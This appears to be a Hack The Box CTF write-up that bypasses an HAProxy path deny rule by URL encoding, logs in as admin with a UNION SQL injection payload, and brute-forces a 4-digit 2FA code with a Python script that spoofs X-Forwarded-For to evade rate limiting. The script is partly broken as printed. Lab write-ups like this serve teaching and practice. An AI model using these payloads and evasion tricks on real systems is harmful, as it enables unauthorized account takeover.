## Web Challenge from Hack The Box

##### Challenge level:- Medium
##### Challenge Description:
Prepare for the finest magic products out there. However, please be aware that we've implemented a specialized protective spell within our web application to guard against any black magic aimed at our web shop.ðŸ”®ðŸŽ©


#### **Website:**

Upon starting the challenge on HackTheBox, we are given a URL to visit furthermore, we are also given the source code of the vulnerable application to download.
Upon visiting the web application, it became apparent that it functioned as an online shop where the ability to make purchases was restricted solely to logged-in users.

navigating to the /auth/login page : 

![forbidden_access.png](/static/images/forbidden_access.png)


the response was   `403 Forbidden` indicating that  the request is forbidden by administrative rules.
Examining the source code, particularly focusing on the HAProxy configuration file `haproxy.cfg`.

![haproxyconfig.png](/static/images/haproxyconfig.png)
  
The `http-request deny if { path_beg /auth/login }` configuration in HAProxy is a directive that denies access to any HTTP request whose path begins with `/auth/login`.
After numerous attempts to understand how to handle this restriction, I discovered that URL encoding was adequate for bypassing it.
URL-encoding of `auth`=`%61%75%74%68`

Upon entering the login page, my subsequent action was to attempt to log in.
Inspecting the code handling the login process:

![444444444444444444444444.png](/static/images/444444444444444444444444.png)

the `login` function uses the function `query_db` to query the database which takes a SQL  query as a parmeter.
the SQL query used to retrieve a user seems to be vulnerable.Using this payload (`testsq' UNION ALL SELECT  username, password FROM users WHERE username = 'admin `) ,I was able to login as an admin.

URL-Encoding(`testsq' UNION ALL SELECT  username, password FROM users WHERE username = 'admin `)==  `%74%65%73%74%73%71%27%20%55%4e%49%4f%4e%20%41%4c%4c%20%53%45%4c%45%43%54%20%20%75%73%65%72%6e%61%6d%65%2c%20%70%61%73%73%77%6f%72%64%20%46%52%4f%4d%20%75%73%65%72%73%20%57%48%45%52%45%20%75%73%65%72%6e%61%6d%65%20%3d%20%27%61%64%6d%69%6e`


![elmoudir.png](/static/images/elmoudir.png)

Once  getting logged , I was redirected to a 2fa code verification page.
according to the login function ,once logged ,the function `set_2fa_code(4)` is called to  generate a random 4-digit Two-Factor Authentication (2FA)  code  and set it in the uwsgi cache valid for 5 minutes. 


![2fa.png](/static/images/2fa.png)

In this scenario, a viable solution could involve employing a brute-force attack, particularly since the target number is limited to a 4-digit length.
While employing Burp Intruder (with attack mode: `sniper`) , the first few requests were successful, but the rest resulted in a 429 status error code.

Upon revisiting the HAProxy configuration, I identified the cause.

![429_statuscode.png](/static/images/429_statuscode.png)

this HAProxy configuration assure if a client makes more than 20 requests in a short timeframe, they will be denied access with a 429 status code. 
An important thing to mention is that the information used to identify clients is taken from the `X-Forwarded-For` header.

That's why I wrote a python script that brute force the 2fa code and changing
the `X-Forwarded-For` every 4 requests.

```python
import requests
from concurrent.futures import ThreadPoolExecutor
def load_wordlist(wordl):
	with open(wordl,'r') as wor:
	return wor.read().splitlines()
	  
def send_requests(codes_2fa,n):
	url='http://188.166.175.58:30948/auth/verify-2fa'
	headers={

	base_ip='192.168.'
	current_ip_suffix=[1,1]	
	with ThreadPoolExecutor(max_workers=100) as executor:
		futures=[]	
		for i,code_2fa in enumerate(codes_2fa,start=1):
			ip=base_ip+str(current_ip_suffix[0])+'.'+str(current_ip_suffix[1])
			future=executor.submit(send_request,ip,code_2fa,headers,url)
			futures.append(future)		
			if i% n ==0:
				current_ip_suffix[1]+=1			
			if current_ip_suffix[1]>254:
				current_ip_suffix[1]=1
				current_ip_suffix[0]+=1			
			if current_ip_suffix[0]>254:
				current_ip_suffix=[1,1]		
		for future in futures:
			future.result()
			
def send_request(ip,code_2fa,headers,url):
	headers['X-Forwarded-For']=ip	
	data={'2fa-code':str(code_2fa)}	
	response=requests.post(url,headers=headers,data=data)
	if 'Invalid 2FA Code!' not in response.text:	
		print(f'IP :{ip},2FA:{code_2fa}:{response.text}')
  

if __name__=='__main__':
my_wordlist='/home/lwess/Downloads/SecLists-master/Fuzzing/4-digits-0000-9999.txt'
codes_2fa=load_wordlist(my_wordlist)
n=4
send_requests(codes_2fa,n)
```

# **Summary:**

The `No-Threshold` web challenge presented by Hack The Box was an exceptional experience. This distinctive challenge centers on a misconfiguration in HAProxy that enables unauthorized access through URI encoding. The journey unfolds by gaining admin privileges through SQL injection exploitation and culminates in overcoming the 2FA-code check through a brute-force attack. Successfully solving the challenge requires chaining together all identified vulnerabilities to ultimately obtain the flag
